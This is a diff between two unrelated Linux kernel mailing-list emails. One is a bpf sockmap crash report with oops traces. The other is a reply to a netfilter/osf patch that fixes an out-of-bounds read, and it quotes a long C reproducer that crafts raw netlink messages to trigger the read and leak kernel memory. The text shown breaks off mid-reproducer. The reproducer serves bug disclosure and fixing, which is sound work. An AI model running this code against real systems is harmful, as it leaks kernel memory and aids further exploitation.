@@ -1,267 +1,797 @@
-Return-Path: <netdev+bounces-31606-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-31607-lists+netdev=lfdr.de@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
-Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [IPv6:2604:1380:45d1:ec00::1])
-	by mail.lfdr.de (Postfix) with ESMTPS id 46FE378F035
-	for <lists+netdev@lfdr.de>; Thu, 31 Aug 2023 17:24:37 +0200 (CEST)
+Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [139.178.88.99])
+	by mail.lfdr.de (Postfix) with ESMTPS id 580C778F05A
+	for <lists+netdev@lfdr.de>; Thu, 31 Aug 2023 17:31:27 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by ny.mirrors.kernel.org (Postfix) with ESMTPS id 76EAC1C20B04
-	for <lists+netdev@lfdr.de>; Thu, 31 Aug 2023 15:24:36 +0000 (UTC)
+	by sv.mirrors.kernel.org (Postfix) with ESMTPS id B5461281549
+	for <lists+netdev@lfdr.de>; Thu, 31 Aug 2023 15:31:25 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 9135212B69;
-	Thu, 31 Aug 2023 15:24:23 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id B8CB812B84;
+	Thu, 31 Aug 2023 15:31:23 +0000 (UTC)
 X-Original-To: netdev@vger.kernel.org
 Received: from lindbergh.monkeyblade.net (lindbergh.monkeyblade.net [23.128.96.19])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 76477134B0;
-	Thu, 31 Aug 2023 15:24:23 +0000 (UTC)
-Received: from szxga02-in.huawei.com (szxga02-in.huawei.com [45.249.212.188])
-	by lindbergh.monkeyblade.net (Postfix) with ESMTPS id D1B03E6E;
-	Thu, 31 Aug 2023 08:23:50 -0700 (PDT)
-Received: from kwepemd100003.china.huawei.com (unknown [172.30.72.56])
-	by szxga02-in.huawei.com (SkyGuard) with ESMTP id 4Rc4cm5DRgzVkLy;
-	Thu, 31 Aug 2023 23:21:12 +0800 (CST)
-Received: from [10.67.111.192] (10.67.111.192) by
- kwepemd100003.china.huawei.com (7.221.188.180) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
- 15.2.1258.23; Thu, 31 Aug 2023 23:23:39 +0800
-Message-ID: <1c533412-b192-3868-991a-d35587329803@huawei.com>
-Date: Thu, 31 Aug 2023 23:23:38 +0800
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A42F19470
+	for <netdev@vger.kernel.org>; Thu, 31 Aug 2023 15:31:23 +0000 (UTC)
+Received: from mx1.riseup.net (mx1.riseup.net [198.252.153.129])
+	by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 0FB9AE4C;
+	Thu, 31 Aug 2023 08:31:20 -0700 (PDT)
+Received: from fews02-sea.riseup.net (fews02-sea-pn.riseup.net [10.0.1.112])
+	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
+	(No client certificate requested)
+	by mx1.riseup.net (Postfix) with ESMTPS id 4Rc4rQ66zzzDrjj;
+	Thu, 31 Aug 2023 15:31:18 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=riseup.net; s=squak;
+	t=1693495879; bh=gNKbPoo1RL4JIDi+0ZlADwafvaZWv0v7WBuyQxa6QOc=;
+	h=Date:Subject:To:Cc:References:From:In-Reply-To:From;
+	b=jFN3lmh1ntlZN8cgP70xu1FvG64ie7+DtWcD87ZjhPXQff9eiVSYI30kxJFgkDHCv
+	 bJ4uBbYfTOumzUqEjgntux4htaBnDI6suORHndgsy1ujGhQAcZha/8O1pxypyppz/m
+	 JtggTEl4c9p5/rfpJEF5OoiRyBBYsqDlD3JQCwKM=
+X-Riseup-User-ID: 60190B7A074E2BA21EB4071E9EEA222457A42EBAE86115FBBA4C528793A036B7
+Received: from [127.0.0.1] (localhost [127.0.0.1])
+	 by fews02-sea.riseup.net (Postfix) with ESMTPSA id 4Rc4rL5lv0zFqhB;
+	Thu, 31 Aug 2023 15:31:14 +0000 (UTC)
+Message-ID: <58217846-9298-e758-c49b-c5183d5a2d51@riseup.net>
+Date: Thu, 31 Aug 2023 17:31:12 +0200
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101
- Thunderbird/91.9.0
-Subject: Re: [BUG bpf-next] bpf/net: Hitting gpf when running selftests
+Subject: Re: [PATCH nf v2] netfilter/osf: avoid OOB read
+To: Wander Lairson Costa <wander@redhat.com>,
+ Pablo Neira Ayuso <pablo@netfilter.org>,
+ Jozsef Kadlecsik <kadlec@netfilter.org>, Florian Westphal <fw@strlen.de>,
+ "David S. Miller" <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>,
+ Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>,
+ "open list:NETFILTER" <netfilter-devel@vger.kernel.org>,
+ "open list:NETFILTER" <coreteam@netfilter.org>,
+ "open list:NETWORKING [GENERAL]" <netdev@vger.kernel.org>,
+ open list <linux-kernel@vger.kernel.org>
+Cc: Lucas Leong <wmliang@infosec.exchange>, stable@kernel.org
+References: <20230831123931.60606-1-wander@redhat.com>
 Content-Language: en-US
-From: Xu Kuohai <xukuohai@huawei.com>
-To: Jiri Olsa <olsajiri@gmail.com>
-CC: Alexei Starovoitov <ast@kernel.org>, Daniel Borkmann
-	<daniel@iogearbox.net>, Andrii Nakryiko <andrii@kernel.org>,
-	<netdev@vger.kernel.org>, <bpf@vger.kernel.org>, Martin KaFai Lau
-	<kafai@fb.com>, Song Liu <songliubraving@fb.com>, Yonghong Song <yhs@fb.com>,
-	John Fastabend <john.fastabend@gmail.com>, KP Singh <kpsingh@chromium.org>,
-	Stanislav Fomichev <sdf@google.com>, Hao Luo <haoluo@google.com>, Hou Tao
-	<houtao1@huawei.com>, Bobby Eshleman <bobby.eshleman@bytedance.com>
-References: <ZO+RQwJhPhYcNGAi@krava> <ZO+vetPCpOOCGitL@krava>
- <23cd4ce0-0360-e3c6-6cc9-f597aefb2ab5@huawei.com>
-In-Reply-To: <23cd4ce0-0360-e3c6-6cc9-f597aefb2ab5@huawei.com>
-Content-Type: text/plain; charset="UTF-8"; format=flowed
-Content-Transfer-Encoding: 8bit
-X-Originating-IP: [10.67.111.192]
-X-ClientProxiedBy: dggems703-chm.china.huawei.com (10.3.19.180) To
- kwepemd100003.china.huawei.com (7.221.188.180)
-X-CFilter-Loop: Reflected
-X-Spam-Status: No, score=-7.7 required=5.0 tests=BAYES_00,NICE_REPLY_A,
-	RCVD_IN_DNSWL_MED,RCVD_IN_MSPIKE_H5,RCVD_IN_MSPIKE_WL,SPF_HELO_NONE,
-	SPF_PASS autolearn=ham autolearn_force=no version=3.4.6
+From: "Fernando F. Mancera" <ffmancera@riseup.net>
+In-Reply-To: <20230831123931.60606-1-wander@redhat.com>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 7bit
+X-Spam-Status: No, score=-2.1 required=5.0 tests=BAYES_00,DKIM_SIGNED,
+	DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_BLOCKED,
+	RCVD_IN_MSPIKE_H3,RCVD_IN_MSPIKE_WL,SPF_HELO_PASS,SPF_PASS
+	autolearn=ham autolearn_force=no version=3.4.6
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
 	lindbergh.monkeyblade.net
 
-On 8/31/2023 5:46 PM, Xu Kuohai wrote:
-> On 8/31/2023 5:07 AM, Jiri Olsa wrote:
->> On Wed, Aug 30, 2023 at 08:58:11PM +0200, Jiri Olsa wrote:
->>> hi,
->>> I'm hitting crash below on bpf-next/master when running selftests,
->>> full log and config attached
->>
->> it seems to be 'test_progs -t sockmap_listen' triggering that
->>
->> jirka
->>
->>>
->>> jirka
->>>
->>>
->>> ---
->>> [ 1022.710250][ T2556] general protection fault, probably for non-canonical address 0x6b6b6b6b6b6b6b73: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC NOPTI^M
->>> [ 1022.711206][ T2556] CPU: 2 PID: 2556 Comm: kworker/2:4 Tainted: G           OE      6.5.0+ #693 1723c8b9805ff5a1672ab7e6f25977078a7bcceb^M
->>> [ 1022.712120][ T2556] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.16.2-1.fc38 04/01/2014^M
->>> [ 1022.712830][ T2556] Workqueue: events sk_psock_backlog^M
->>> [ 1022.713262][ T2556] RIP: 0010:skb_dequeue+0x4c/0x80^M
->>> [ 1022.713653][ T2556] Code: 41 48 85 ed 74 3c 8b 43 10 4c 89 e7 83 e8 01 89 43 10 48 8b 45 08 48 8b 55 00 48 c7 45 08 00 00 00 00 48 c7 45 00 00 00 00 00 <48> 89 42 08 48 89 10 e8 e8 6a 41 00 48 89 e8 5b 5d 41 5c c3 cc cc^M
->>> [ 1022.714963][ T2556] RSP: 0018:ffffc90003ca7dd0 EFLAGS: 00010046^M
->>> [ 1022.715431][ T2556] RAX: 6b6b6b6b6b6b6b6b RBX: ffff88811de269d0 RCX: 0000000000000000^M
->>> [ 1022.716068][ T2556] RDX: 6b6b6b6b6b6b6b6b RSI: 0000000000000282 RDI: ffff88811de269e8^M
->>> [ 1022.716676][ T2556] RBP: ffff888141ae39c0 R08: 0000000000000001 R09: 0000000000000000^M
->>> [ 1022.717283][ T2556] R10: 0000000000000001 R11: 0000000000000000 R12: ffff88811de269e8^M
->>> [ 1022.717930][ T2556] R13: 0000000000000001 R14: ffff888141ae39c0 R15: ffff88810a20e640^M
->>> [ 1022.718549][ T2556] FS:  0000000000000000(0000) GS:ffff88846d600000(0000) knlGS:0000000000000000^M
->>> [ 1022.719241][ T2556] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033^M
->>> [ 1022.719761][ T2556] CR2: 00007fb5c25ca000 CR3: 000000012b902004 CR4: 0000000000770ee0^M
->>> [ 1022.720394][ T2556] PKRU: 55555554^M
->>> [ 1022.720699][ T2556] Call Trace:^M
->>> [ 1022.720984][ T2556]  <TASK>^M
->>> [ 1022.721254][ T2556]  ? die_addr+0x32/0x80^M
->>> [ 1022.721589][ T2556]  ? exc_general_protection+0x25a/0x4b0^M
->>> [ 1022.722026][ T2556]  ? asm_exc_general_protection+0x22/0x30^M
->>> [ 1022.722489][ T2556]  ? skb_dequeue+0x4c/0x80^M
->>> [ 1022.722854][ T2556]  sk_psock_backlog+0x27a/0x300^M
->>> [ 1022.723243][ T2556]  process_one_work+0x2a7/0x5b0^M
->>> [ 1022.723633][ T2556]  worker_thread+0x4f/0x3a0^M
->>> [ 1022.723998][ T2556]  ? __pfx_worker_thread+0x10/0x10^M
->>> [ 1022.724386][ T2556]  kthread+0xfd/0x130^M
->>> [ 1022.724709][ T2556]  ? __pfx_kthread+0x10/0x10^M
->>> [ 1022.725066][ T2556]  ret_from_fork+0x2d/0x50^M
->>> [ 1022.725409][ T2556]  ? __pfx_kthread+0x10/0x10^M
->>> [ 1022.725799][ T2556]  ret_from_fork_asm+0x1b/0x30^M
->>> [ 1022.726201][ T2556]  </TASK>^M
->>
->>
->> .
+On 31/08/2023 14:39, Wander Lairson Costa wrote:
+> The opt_num field is controlled by user mode and is not currently
+> validated inside the kernel. An attacker can take advantage of this to
+> trigger an OOB read and potentially leak information.
 > 
-> My patch failed on the BPF CI, and the log shows the test also died in skb_dequeue:
+> Reproducer:
 > 
-> https://github.com/kernel-patches/bpf/actions/runs/6031993528/job/16366782122
-> 
-> [...]
-> 
->    [   74.396478]  ? __die_body+0x1f/0x70
->    [   74.396700]  ? page_fault_oops+0x15b/0x450
->    [   74.396957]  ? fixup_exception+0x26/0x330
->    [   74.397211]  ? exc_page_fault+0x68/0x1a0
->    [   74.397457]  ? asm_exc_page_fault+0x26/0x30
->    [   74.397724]  ? skb_dequeue+0x52/0x90
->    [   74.397954]  sk_psock_destroy+0x8c/0x2b0
->    [   74.398204]  process_one_work+0x28a/0x550
->    [   74.398458]  ? __pfx_worker_thread+0x10/0x10
->    [   74.398730]  worker_thread+0x51/0x3c0
->    [   74.398966]  ? __pfx_worker_thread+0x10/0x10
->    [   74.399235]  kthread+0xf7/0x130
->    [   74.399437]  ? __pfx_kthread+0x10/0x10
->    [   74.399707]  ret_from_fork+0x34/0x50
->    [   74.399967]  ? __pfx_kthread+0x10/0x10
->    [   74.400234]  ret_from_fork_asm+0x1b/0x30
-> 
-> 
-> After a few tries, I found a way to reproduce the problem.
-> 
-> Here is the reproduce steps:
-> 
-> 1. create a kprobe to delay sk_psock_backlog:
-> 
-> static struct kprobe kp = {
->          .symbol_name = "sk_psock_backlog",
->          .offset = 0x00,
-> };
-> 
-> static int handler_pre(struct kprobe *p, struct pt_regs *regs)
+> void install_filter_for_leak()
 > {
->          mdelay(1000);
->          return 0;
+> 	char buf[0x1000] = {0};
+>          struct iovec io = {
+> 		.iov_base = buf,
+> 		.iov_len = sizeof(buf)
+>          };
+>          struct msghdr msg = {0};
+>          msg.msg_iov = &io;
+>          msg.msg_iovlen = 1;
+> 
+> 	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
+> 	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));
+> 
+> 	memset(buf, 0, sizeof(buf));
+> 	*(uint32_t*)(buf) = 0x14;
+> 	*(uint16_t*)(buf+4) = 0x10;
+> 	*(uint16_t*)(buf+6) = 1;
+> 	*(uint32_t*)(buf+8) = 0x63072925;
+> 	*(uint16_t*)(buf+0x12) = 0xa;
+> 	*(uint32_t*)(buf+0x14) = 0x20;
+> 	*(uint16_t*)(buf+0x18) = 0xa00;
+> 	*(uint16_t*)(buf+0x1a) = 0x5;
+> 	*(uint32_t*)(buf+0x1c) = 0x63072926;
+> 	*(uint8_t*)(buf+0x24) = 2;
+> 
+> 	*(uint16_t*)(buf+0x28) = 0xb;
+> 	*(uint16_t*)(buf+0x2a) = 1;
+> 	strcpy((void*)(buf+0x2c), "filter");
+> 
+> 	*(uint32_t*)(buf+0x34) = 0x14;
+> 	*(uint16_t*)(buf+0x38) = 0x11;
+> 	*(uint16_t*)(buf+0x3a) = 1;
+> 	*(uint32_t*)(buf+0x3c) = 0x63072927;
+> 	*(uint16_t*)(buf+0x46) = 0xa;
+> 	io.iov_len = 0x48;
+>          sendmsg(fd, &msg, 0);
+> 
+> 	memset(buf, 0, sizeof(buf));
+> 	*(uint32_t*)(buf) = 0x14;
+> 	*(uint16_t*)(buf+4) = 0x10;
+> 	*(uint16_t*)(buf+6) = 1;
+> 	*(uint32_t*)(buf+8) = 0x63072925;
+> 	*(uint16_t*)(buf+0x12) = 0xa;
+> 	*(uint16_t*)(buf+0x14) = 0x40;
+> 	*(uint16_t*)(buf+0x18) = 0xa03;
+> 	*(uint16_t*)(buf+0x1a) = 0x5;
+> 	*(uint32_t*)(buf+0x1c) = 0x63072926;
+> 	*(uint32_t*)(buf+0x24) = 2;
+> 
+> 	*(uint16_t*)(buf+0x28) = 0xb;
+> 	*(uint16_t*)(buf+0x2a) = 1;
+> 	strcpy((void*)(buf+0x2c), "filter");
+> 	*(uint16_t*)(buf+0x34) = 0xa;
+> 	*(uint16_t*)(buf+0x36) = 3;
+> 	strcpy((void*)(buf+0x38), "input");
+> 	*(uint16_t*)(buf+0x40) = 0x14;
+> 	*(uint16_t*)(buf+0x42) = 0x8004;
+> 	*(uint16_t*)(buf+0x44) = 8;
+> 	*(uint16_t*)(buf+0x46) = 1;
+> 	*(uint32_t*)(buf+0x48) = 0x1000000;
+> 	*(uint16_t*)(buf+0x4c) = 8;
+> 	*(uint16_t*)(buf+0x4e) = 2;
+> 	*(uint32_t*)(buf+0x50) = 0;
+> 
+> 	*(uint32_t*)(buf+0x54) = 0x14;
+> 	*(uint16_t*)(buf+0x58) = 0x11;
+> 	*(uint16_t*)(buf+0x5a) = 1;
+> 	*(uint32_t*)(buf+0x5c) = 0x63072f50;
+> 	*(uint16_t*)(buf+0x66) = 0xa;
+> 	io.iov_len = 0x68;
+>          sendmsg(fd, &msg, 0);
+> 
+> 	memset(buf, 0, sizeof(buf));
+> 	*(uint32_t*)(buf) = 0x14;
+> 	*(uint16_t*)(buf+4) = 0x10;
+> 	*(uint16_t*)(buf+6) = 1;
+> 	*(uint32_t*)(buf+8) = 0x63072925;
+> 	*(uint16_t*)(buf+0x12) = 0xa;
+> 	*(uint16_t*)(buf+0x14) = 0x40;
+> 	*(uint16_t*)(buf+0x18) = 0xa03;
+> 	*(uint16_t*)(buf+0x1a) = 5;
+> 	*(uint32_t*)(buf+0x1c) = 0x63072926;
+> 	*(uint32_t*)(buf+0x24) = 2;
+> 	*(uint16_t*)(buf+0x28) = 0xb;
+> 	*(uint16_t*)(buf+0x2a) = 1;
+> 	strcpy((void*)(buf+0x2c), "filter");
+> 	*(uint16_t*)(buf+0x34) = 0xb;
+> 	*(uint16_t*)(buf+0x36) = 3;
+> 	strcpy((void*)(buf+0x38), "output");
+> 	*(uint16_t*)(buf+0x40) = 0x14;
+> 	*(uint16_t*)(buf+0x42) = 0x8004;
+> 	*(uint16_t*)(buf+0x44) = 8;
+> 	*(uint16_t*)(buf+0x46) = 1;
+> 	*(uint32_t*)(buf+0x48) = 0x3000000;
+> 	*(uint16_t*)(buf+0x4c) = 8;
+> 	*(uint16_t*)(buf+0x4e) = 2;
+> 	*(uint32_t*)(buf+0x50) = 0;
+> 
+> 	*(uint32_t*)(buf+0x54) = 0x14;
+> 	*(uint16_t*)(buf+0x58) = 0x11;
+> 	*(uint16_t*)(buf+0x5a) = 1;
+> 	*(uint32_t*)(buf+0x5c) = 0x63072f50;
+> 	*(uint16_t*)(buf+0x66) = 0xa;
+> 	io.iov_len = 0x68;
+>          sendmsg(fd, &msg, 0);
+> 
+> 	memset(buf, 0, sizeof(buf));
+> 	*(uint32_t*)(buf) = 0x14;
+> 	*(uint16_t*)(buf+4) = 0x10;
+> 	*(uint16_t*)(buf+6) = 1;
+> 	*(uint32_t*)(buf+8) = 0x63072925;
+> 	*(uint16_t*)(buf+0x12) = 0xa;
+> 	*(uint16_t*)(buf+0x14) = 0x2c;
+> 	*(uint16_t*)(buf+0x18) = 0xa03;
+> 	*(uint16_t*)(buf+0x1a) = 0x5;
+> 	*(uint32_t*)(buf+0x1c) = 0x63072926;
+> 	*(uint32_t*)(buf+0x24) = 2;
+> 	*(uint16_t*)(buf+0x28) = 0xb;
+> 	*(uint16_t*)(buf+0x2a) = 1;
+> 	strcpy((void*)(buf+0x2c), "filter");
+> 	*(uint16_t*)(buf+0x34) = 0x9;
+> 	*(uint16_t*)(buf+0x36) = 3;
+> 	strcpy((void*)(buf+0x38), "leak");
+> 
+> 	*(uint32_t*)(buf+0x40) = 0x14;
+> 	*(uint16_t*)(buf+0x44) = 0x11;
+> 	*(uint16_t*)(buf+0x46) = 1;
+> 	*(uint32_t*)(buf+0x48) = 0x63072f50;
+> 	*(uint16_t*)(buf+0x52) = 0xa;
+> 	io.iov_len = 0x54;
+>          sendmsg(fd, &msg, 0);
+> 
+> 	char buf5[] = {
+> 		0x14, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
+> 		0x74, 0x41, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
+> 		0x00, 0x00, 0x0a, 0x00, 0x1c, 0x01, 0x00, 0x00,
+> 		0x06, 0x0a, 0x05, 0x0c, 0x75, 0x41, 0x07, 0x63,
+> 		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
+> 		0x0b, 0x00, 0x01, 0x00, 0x66, 0x69, 0x6c, 0x74,
+> 		0x65, 0x72, 0x00, 0x00, 0x0a, 0x00, 0x02, 0x00,
+> 		0x69, 0x6e, 0x70, 0x75, 0x74, 0x00, 0x00, 0x00,
+> 		0xf0, 0x00, 0x04, 0x80, 0x24, 0x00, 0x01, 0x80,
+> 		0x09, 0x00, 0x01, 0x00, 0x6d, 0x65, 0x74, 0x61,
+> 		0x00, 0x50, 0x02, 0x00, 0x14, 0x00, 0x02, 0x80,
+> 		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x10,
+> 		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
+> 		0x2c, 0x00, 0x01, 0x80, 0x08, 0x00, 0x01, 0x00,
+> 		0x63, 0x6d, 0x70, 0x00, 0x20, 0x00, 0x02, 0x80,
+> 		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
+> 		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
+> 		0x0c, 0x00, 0x03, 0x80, 0x05, 0x00, 0x01, 0x00,
+> 		0x06, 0xb0, 0x1b, 0x00, 0x34, 0x00, 0x01, 0x80,
+> 		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
+> 		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
+> 		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
+> 		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x02,
+> 		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x0d,
+> 		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x01,
+> 		0x2c, 0x00, 0x01, 0x80, 0x08, 0x00, 0x01, 0x00,
+> 		0x63, 0x6d, 0x70, 0x00, 0x20, 0x00, 0x02, 0x80,
+> 		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
+> 		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
+> 		0x0c, 0x00, 0x03, 0x80, 0x05, 0x00, 0x01, 0x00,
+> 		0x18, 0xd3, 0x01, 0x00, 0x3c, 0x00, 0x01, 0x80,
+> 		0x0e, 0x00, 0x01, 0x00, 0x69, 0x6d, 0x6d, 0x65,
+> 		0x64, 0x69, 0x61, 0x74, 0x65, 0x00, 0x00, 0x00,
+> 		0x28, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
+> 		0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x02, 0x80,
+> 		0x18, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
+> 		0xff, 0xff, 0xff, 0xfd, 0x09, 0x00, 0x02, 0x00,
+> 		0x6c, 0x65, 0x61, 0x6b, 0x00, 0x00, 0x00, 0x00,
+> 		0x14, 0x00, 0x00, 0x00, 0x11, 0x00, 0x01, 0x00,
+> 		0x76, 0x41, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
+> 		0x00, 0x00, 0x0a, 0x00};
+> 	memset(buf, 0, sizeof(buf));
+> 	memcpy(buf, buf5, sizeof(buf5));
+> 	io.iov_len = 0x144;
+>          sendmsg(fd, &msg, 0);
+> 
+> 	char buf6[] = {
+> 		0x14, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
+> 		0xd9, 0x4e, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
+> 		0x00, 0x00, 0x0a, 0x00, 0x54, 0x01, 0x00, 0x00,
+> 		0x06, 0x0a, 0x05, 0x0c, 0xda, 0x4e, 0x07, 0x63,
+> 		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
+> 		0x0b, 0x00, 0x01, 0x00, 0x66, 0x69, 0x6c, 0x74,
+> 		0x65, 0x72, 0x00, 0x00, 0x09, 0x00, 0x02, 0x00,
+> 		0x6c, 0x65, 0x61, 0x6b, 0x00, 0x00, 0x00, 0x00,
+> 		0x28, 0x01, 0x04, 0x80, 0x34, 0x00, 0x01, 0x80,
+> 		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
+> 		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
+> 		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x02,
+> 		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x02,
+> 		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x03,
+> 		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x01,
+> 		0x34, 0x00, 0x01, 0x80, 0x0c, 0x00, 0x01, 0x00,
+> 		0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x00,
+> 		0x24, 0x00, 0x02, 0x80, 0x08, 0x00, 0x05, 0x00,
+> 		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x02, 0x00,
+> 		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x03, 0x00,
+> 		0x00, 0x00, 0x00, 0x0d, 0x08, 0x00, 0x04, 0x00,
+> 		0x00, 0x00, 0x00, 0x01, 0x34, 0x00, 0x01, 0x80,
+> 		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
+> 		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
+> 		0x08, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x02,
+> 		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01,
+> 		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x08,
+> 		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x01,
+> 		0x2c, 0x00, 0x01, 0x80, 0x08, 0x00, 0x01, 0x00,
+> 		0x63, 0x6d, 0x70, 0x00, 0x20, 0x00, 0x02, 0x80,
+> 		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x02,
+> 		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01,
+> 		0x0c, 0x00, 0x03, 0x80, 0x05, 0x00, 0x01, 0x00,
+> 		0x02, 0x00, 0x02, 0x80, 0x2c, 0x00, 0x01, 0x80,
+> 		0x08, 0x00, 0x01, 0x00, 0x63, 0x6d, 0x70, 0x00,
+> 		0x20, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
+> 		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x02, 0x00,
+> 		0x00, 0x00, 0x00, 0x01, 0x0c, 0x00, 0x03, 0x80,
+> 		0x05, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x00,
+> 		0x30, 0x00, 0x01, 0x80, 0x0e, 0x00, 0x01, 0x00,
+> 		0x69, 0x6d, 0x6d, 0x65, 0x64, 0x69, 0x61, 0x74,
+> 		0x65, 0x00, 0x02, 0x00, 0x1c, 0x00, 0x02, 0x80,
+> 		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+> 		0x10, 0x00, 0x02, 0x80, 0x0c, 0x00, 0x02, 0x80,
+> 		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+> 		0x14, 0x00, 0x00, 0x00, 0x11, 0x00, 0x01, 0x00,
+> 		0xdb, 0x4e, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
+> 		0x00, 0x00, 0x0a, 0x00};
+> 	memset(buf, 0, sizeof(buf));
+> 	memcpy(buf, buf6, sizeof(buf6));
+> 	io.iov_len = 0x17c;
+>          sendmsg(fd, &msg, 0);
+> 
+> 	char buf7[] = {
+> 		0x14, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
+> 		0x7c, 0x64, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
+> 		0x00, 0x00, 0x0a, 0x00, 0x50, 0x00, 0x00, 0x00,
+> 		0x06, 0x0a, 0x05, 0x0c, 0x7d, 0x64, 0x07, 0x63,
+> 		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
+> 		0x0b, 0x00, 0x01, 0x00, 0x66, 0x69, 0x6c, 0x74,
+> 		0x65, 0x72, 0x00, 0x00, 0x09, 0x00, 0x02, 0x00,
+> 		0x6c, 0x65, 0x61, 0x6b, 0x00, 0x00, 0x00, 0x00,
+> 		0x24, 0x00, 0x04, 0x80, 0x20, 0x00, 0x01, 0x80,
+> 		0x08, 0x00, 0x01, 0x00, 0x6f, 0x73, 0x66, 0x00,
+> 		0x14, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
+> 		0x00, 0x00, 0x00, 0x04, 0x08, 0x00, 0x03, 0x00,
+> 		0x00, 0x00, 0x00, 0x01, 0x14, 0x00, 0x00, 0x00,
+> 		0x11, 0x00, 0x01, 0x00, 0x7e, 0x64, 0x07, 0x63,
+> 		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00,
+> 	};
+> 	memset(buf, 0, sizeof(buf));
+> 	memcpy(buf, buf7, sizeof(buf7));
+> 	io.iov_len = 0x78;
